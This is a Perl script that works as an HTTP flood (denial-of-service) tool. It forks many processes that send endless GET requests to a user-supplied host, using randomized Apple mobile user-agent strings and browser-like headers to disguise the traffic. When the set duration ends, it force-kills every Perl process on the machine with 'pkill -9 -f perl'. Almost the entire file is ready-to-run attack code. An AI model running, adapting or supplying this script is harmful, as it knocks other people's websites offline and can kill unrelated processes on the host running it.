#!/usr/bin/perl

use strict;
use IO::Socket::SSL;
use IO::Socket::INET;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Headers;
use URI;

my @UAs = (
   "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 4_3_3 like Mac OS X) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 3_1_3 like Mac OS X) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 3_1_3 like Mac OS X) AppleWebKit/528.18 (KHTML, like Gecko) Version/3.1.3 Mobile Safari/525.20.1",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 2_2_1 like Mac OS X) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.2 Mobile/5H11 Safari/525.20",
   "Mozilla/5.0 (iPhone; CPU iPhone OS 2_2 like Mac OS X) AppleWebKit/525.26 (KHTML, like Gecko) Version/3.1.2 Mobile/5G77 Safari/525.20",
   "Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_1_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1 Mobile/5H11 Safari/525.20",
   "Mozilla/5.0 (iPhone;) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1 Mobile/5H11 Safari/525.20",
   "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/3.2.2 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_9 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.5 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.5 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPhone;) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.5 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-gb) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.5 Mobile/7B405 Safari/531.21.10",
   "Mozilla/5.0 (iPad; U; CPU OS 5_1_1 like Mac OS X; en-us) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 2_0 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A345 Safari/525.20.1",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A400 Safari/528.16",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
   "Mozilla/5.0 (iPod; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
   "Mozilla/5.0 (iPod; CPU iPhone OS 6_1_6 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0.6 Mobile/10B500 Safari/8536.25",
   "Mozilla/5.0 (iPod; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (iPod; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
   "Mozilla/5.0 (iPod; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 11_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15G77 Safari/604.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 12_4_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17H35 Safari/604.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPod; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPod;) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 5_1_1 like Mac OS X; en-us) AppleWebKit/534.46.0 (KHTML, like Gecko) Version/5.1.1 Mobile/9B206 Safari/7534.48.3",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 6_1_6 like Mac OS X; en-us) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/10B500",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 7_1_2 like Mac OS X; en-us) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 8_3 like Mac OS X; en-us) AppleWebKit/539.55.5 (KHTML, like Gecko) Version/8.0.3 Mobile/12F69 Safari/6533.18.5",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 9_3_5 like Mac OS X; en-us) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 10_3_3 like Mac OS X; en-us) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 11_1_2 like Mac OS X; en-gb) AppleWebKit/604.3.1 (KHTML, like Gecko) Mobile/15B202",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 12_2 like Mac OS X; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPod; U; CPU iPhone OS 13_2 like Mac OS X; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/13F69 Safari/605.1.15"
   # Add more User Agents here as needed
);

my %headers = ( 
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
    'Accept-Language' => 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests' => '1',
    'Accept-Encoding' => 'gzip, deflate, br'
);

sub getRandomUA {
    return $UAs[rand @UAs];
}

sub getRandomNumberBetween {
    my ($min, $max) = @_;
    return int(rand($max - $min + 1) + $min);
}

sub flood {
    my $parsed = shift;
    my $ua = LWP::UserAgent->new;
    $ua->agent(getRandomUA());
    $ua->default_headers(HTTP::Headers->new(%headers));
    
    for (my $i = 0; $i < $ARGV[2]; $i++) {
        my $request = HTTP::Request->new('GET', $parsed->as_string());
        $ua->request($request);
    }
}

sub runflood {
    my $parsed = shift;
    while (1) {
        flood($parsed);
    }
}

sub additionalFunction {
    # Define your additional function here
    print "Additional function called
";
}

if (@ARGV != 4) {
    die "Usage: host threads rate duration";
} else {
    print "LAUNCHED!...\n";
    for (my $i = 0; $i < $ARGV[1]; $i++) {
        my $pid = fork();
        if ($pid) {
            # Parent process
        }
        elsif ($pid == 0) {
            # Child process
            my $parsed = URI->new($ARGV[0]);
            runflood($parsed);
            additionalFunction();
            exit;
        }
        else {
            die "Fork failed: $!\n";
        }
    }
    print "FIRE IN THE HOLE!\n";
    sleep($ARGV[3]);
    print "FINISH..\n";

    # Kill the perl processes after the duration ends using pkill
    system("pkill -9 -f perl &");
}